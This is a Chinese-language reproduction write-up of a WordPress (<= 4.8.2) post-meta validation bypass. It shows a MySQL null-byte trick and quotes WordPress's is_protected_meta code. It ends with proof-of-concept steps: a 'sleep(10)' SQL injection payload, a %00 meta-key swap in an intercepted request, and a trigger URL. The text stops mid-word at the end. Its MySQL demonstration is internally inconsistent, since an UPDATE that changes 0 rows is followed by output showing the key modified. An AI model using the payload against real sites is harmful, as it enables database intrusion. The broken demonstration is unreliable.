Wordpress \<= 4.8.2 POST META 校验绕过漏洞
==========================================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 一个MySQL的trick

1). 正常的条件查询语句

    mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
    +---------+---------+----------------+------------+
    | meta_id | post_id | meta_key       | meta_value |
    +---------+---------+----------------+------------+
    |       4 |       4 | _thumbnail_id  | TESTC      |
    +---------+---------+----------------+------------+
    1 row in set (0.00 sec)

2). 现在我们将\_thumbnail\_id修改成"\\x00\_thumbnail\_id"

    mysql> update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id';
    Query OK, 0 rows affected (0.00 sec)
    Rows matched: 0  Changed: 0  Warnings: 0

3). 再次执行第一步的查询

    mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
    +---------+---------+----------------+------------+
    | meta_id | post_id | meta_key       | meta_value |
    +---------+---------+----------------+------------+
    |       4 |       4 |  _thumbnail_id | TESTC      |
    +---------+---------+----------------+------------+
    1 row in set (0.00 sec)

我们可以发现依然可以查询出修改后的数据。

### POST META 校验绕过

我们来看下检查meta\_key的代码，文件./wp-includes/meta.php：

    function is_protected_meta( $meta_key, $meta_type = null ) {
        $protected = ( '_' == $meta_key[0] );
        /**
         * Filters whether a meta key is protected.
         *
         * [@since](/since) 3.2.0
         *
         * [@param](/param) bool   $protected Whether the key is protected. Default false.
         * [@param](/param) string $meta_key  Meta key.
         * [@param](/param) string $meta_type Meta type.
         */
        return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type );
    }

is*protected\_meta函数只检查了\$meta\_key的第一个字符是否以*开头。我们有了2.1的MySQL
trick，想要绕过meta\_key的检查就显得容易多了。

### poc

    添加自定义字段，meta_key为’_thumbnail_id’的meta_value为’55 %1$%s or sleep(10)#’
    在添加自定义栏目/字段时抓包，将_thumbnail_id替换为%00_thumbnail_id
    访问/wp-admin/edit.php?action=delete&_wpnonce=xxx&ids=55 %1$%s or sleep(10)#，触发SQL注入漏洞
    参
